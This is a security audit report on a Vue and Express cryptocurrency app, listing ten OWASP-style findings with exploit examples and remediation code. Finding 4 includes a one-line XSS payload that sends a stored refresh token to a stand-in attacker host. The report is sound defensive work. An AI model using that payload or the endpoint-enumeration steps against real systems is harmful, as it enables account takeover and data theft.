# Security Audit Report (OWASP Top 10)

Scope reviewed:
- Frontend: Vue 3 + Pinia + Tailwind
- Backend: Express + MongoDB + Socket.io + JWT
- External APIs: CoinGecko / CCXT

## 1) Broken Access Control: User directory exposed to any authenticated account
- **Vulnerability**: Any logged-in user can enumerate all users (`name`, `email`, `avatar`, `createdAt`) through `GET /api/auth/users`.
- **Where it occurs**: `server/routes/auth.js` and `server/controllers/authController.js`.
- **Exploit example**:
  ```bash
  curl -H "Authorization: Bearer <any-valid-user-token>" \
    http://localhost:5000/api/auth/users
  ```
- **Risk level**: **High** (PII exposure + user enumeration + enables targeted attacks).
- **Fix with code example**:
  ```js
  // middleware/requireRole.js
  module.exports = (...roles) => (req, res, next) => {
    if (!req.user || !roles.includes(req.user.role)) {
      return res.status(403).json({ success: false, message: 'Forbidden' })
    }
    next()
  }

  // routes/auth.js
  const requireRole = require('../middleware/requireRole')
  router.get('/users', auth, requireRole('admin'), getAllUsers)
  ```

## 2) Missing brute-force/rate limiting on auth and expensive endpoints
- **Vulnerability**: No rate limiter on login/register/refresh, or expensive public endpoints.
- **Where it occurs**: Auth routes and global app setup.
- **Exploit example**:
  - Credential stuffing against `POST /api/auth/login`.
  - API abuse against public data/sync endpoints.
- **Risk level**: **High** (account takeover attempts + DoS cost amplification).
- **Fix with code example**:
  ```js
  const rateLimit = require('express-rate-limit')

  const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,
    limit: 10,
    standardHeaders: true,
    legacyHeaders: false
  })

  app.use('/api/auth/login', authLimiter)
  app.use('/api/auth/register', authLimiter)
  app.use('/api/auth/refresh', authLimiter)
  ```

## 3) Refresh tokens stored in plaintext + sent in JSON body (replay risk)
- **Vulnerability**: Refresh token is stored plaintext in MongoDB and sent/accepted in request bodies.
- **Where it occurs**: `server/models/RefreshToken.js`, `server/controllers/authController.js`, `src/stores/auth.js`.
- **Exploit example**:
  - DB leak or logs leak yields reusable refresh tokens.
  - Stolen refresh token can mint fresh access tokens until revoked/expired.
- **Risk level**: **High**.
- **Fix with code example**:
  ```js
  // Store hash only
  const crypto = require('crypto')
  const hash = (t) => crypto.createHash('sha256').update(t).digest('hex')

  // create
  const raw = crypto.randomBytes(64).toString('hex')
  await RefreshToken.create({ tokenHash: hash(raw), user: userId, expiresAt })

  // verify
  const tokenDoc = await RefreshToken.findOne({ tokenHash: hash(refreshToken) })
  ```
  ```js
  // Also prefer HttpOnly + Secure + SameSite cookies for refresh tokens
  res.cookie('refreshToken', raw, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/api/auth/refresh'
  })
  ```

## 4) JWT and refresh token persisted in localStorage (XSS => account takeover)
- **Vulnerability**: Access and refresh tokens are persisted in `localStorage`.
- **Where it occurs**: `src/stores/auth.js`.
- **Exploit example**:
  ```js
  // Any XSS payload can exfiltrate tokens
  fetch('https://attacker.tld/steal?rt=' + localStorage.getItem('cryptodev-refresh-token'))
  ```
- **Risk level**: **High**.
- **Fix with code example**:
  ```js
  // Keep short-lived access token in memory, refresh token in HttpOnly cookie
  const accessToken = ref(null) // no localStorage
  ```

## 5) CORS allows credentialed requests from broad localhost regex
- **Vulnerability**: CORS origin allows any localhost port by regex while credentials are enabled.
- **Where it occurs**: `server/index.js` (Express + Socket.io CORS).
- **Exploit example**:
  - Malicious local site running on arbitrary localhost port can send credentialed cross-origin requests in dev.
- **Risk level**: **Medium**.
- **Fix with code example**:
  ```js
  const allowedOrigins = (process.env.CORS_ORIGIN || '')
    .split(',')
    .map(s => s.trim())
    .filter(Boolean)

  app.use(cors({
    origin: (origin, cb) => {
      if (!origin || allowedOrigins.includes(origin)) return cb(null, true)
      return cb(new Error('CORS blocked'))
    },
    credentials: true
  }))
  ```

## 6) Missing hardened HTTP security headers
- **Vulnerability**: No `helmet` setup; missing CSP, HSTS, frameguard, `X-Content-Type-Options: nosniff`, etc.
- **Where it occurs**: `server/index.js` global middleware.
- **Exploit example**:
  - Increased impact surface for XSS/clickjacking/content sniffing.
- **Risk level**: **Medium**.
- **Fix with code example**:
  ```js
  const helmet = require('helmet')
  app.use(helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        connectSrc: ["'self'", 'https://api.coingecko.com']
      }
    }
  }))
  ```

## 7) WebSocket auth bypass/fallback-to-guest + token via query string accepted
- **Vulnerability**:
  - Invalid/missing token still allows socket connection as guest.
  - Token can be passed through URL query string (leak in logs/proxies/history).
- **Where it occurs**: `server/socket/index.js`.
- **Exploit example**:
  - Automated unauthenticated socket flooding.
  - Token replay from captured query string.
- **Risk level**: **Medium**.
- **Fix with code example**:
  ```js
  io.use(async (socket, next) => {
    try {
      const token = socket.handshake.auth?.token
      if (!token) return next(new Error('Authentication required'))
      const decoded = jwt.verify(token, process.env.JWT_SECRET)
      const user = await User.findById(decoded.userId)
      if (!user) return next(new Error('Invalid token'))
      socket.user = user
      next()
    } catch {
      next(new Error('Unauthorized'))
    }
  })
  ```

## 8) Public state-changing operational endpoints (cache clearing and data sync)
- **Vulnerability**:
  - `DELETE /api/exchange/cache` is unauthenticated.
  - `POST /api/ohlc/:coinId/sync` and `/sync-all` are public and force expensive work.
- **Where it occurs**: `server/routes/exchange.js`, `server/routes/ohlc.js`.
- **Exploit example**:
  - Repeated cache clears degrade availability and increase upstream API calls.
  - Repeated sync jobs can exhaust service and third-party quotas.
- **Risk level**: **High**.
- **Fix with code example**:
  ```js
  const { auth } = require('../middleware/auth')
  const requireRole = require('../middleware/requireRole')

  router.delete('/cache', auth, requireRole('admin'), handler)
  router.post('/:coinId/sync', auth, requireRole('admin'), handler)
  router.post('/:coinId/sync-all', auth, requireRole('admin'), handler)
  ```

## 9) Input hardening gaps (prototype pollution / schema abuse risk)
- **Vulnerability**: Profile update merges arbitrary `settings`/`socialLinks` objects into persisted document without strict allowlist.
- **Where it occurs**: `server/controllers/authController.js`.
- **Exploit example**:
  - Send oversized/deep unexpected objects (`__proto__`, unbounded nested keys) to cause persistence abuse or runtime edge cases.
- **Risk level**: **Medium**.
- **Fix with code example**:
  ```js
  const allowedSettings = ['currency', 'theme', 'notifications']
  const sanitizedSettings = Object.fromEntries(
    Object.entries(req.body.settings || {}).filter(([k]) => allowedSettings.includes(k))
  )
  updateData.settings = { ...req.user.settings, ...sanitizedSettings }
  ```

## 10) File upload trust on MIME only + publicly served uploads
- **Vulnerability**: Upload filter relies on client-controlled MIME type and files are directly served from `/uploads`.
- **Where it occurs**: `server/middleware/upload.js` and static file serving in `server/index.js`.
- **Exploit example**:
  - Malicious polyglot payload masquerading as image may be served to users.
- **Risk level**: **Medium**.
- **Fix with code example**:
  ```js
  const FileType = require('file-type')
  // After upload, inspect magic bytes and reject mismatch
  // Serve with strict headers:
  app.use('/uploads', express.static(uploadPath, {
    setHeaders: (res) => {
      res.setHeader('X-Content-Type-Options', 'nosniff')
      res.setHeader('Content-Security-Policy', "default-src 'none'; img-src 'self' data:")
    }
  }))
  ```

---

## Explicit checks requested

### Authentication / Authorization
- JWT auth exists, but no role-based authorization controls for sensitive listing endpoints.
- Token lifecycle exists, but refresh token handling is weak against replay and theft.

### Input validation
- Some routes use `express-validator`, but several state-changing/public routes have weak/no validation and no abuse controls.

### Data exposure
- User listing endpoint exposes email metadata broadly to any authenticated user.

### API endpoints
- Multiple operational endpoints that change system state are unauthenticated.

### WebSockets
- Handshake accepts token in query string and falls back to guest on auth failure.

### JWT usage
- JWT usage is standard, but storage strategy and refresh-token architecture are high risk.

### MongoDB queries / NoSQL injection
- No direct operator injection primitive was found in the inspected query builders, but schema/update hardening should be strengthened (allowlists + sanitizeFilter) to reduce future NoSQL-injection risk.

### CSRF
- Current architecture mainly uses Bearer headers, so classic browser CSRF risk is reduced; if refresh tokens move to cookies (recommended), add CSRF token protections on refresh/logout endpoints.
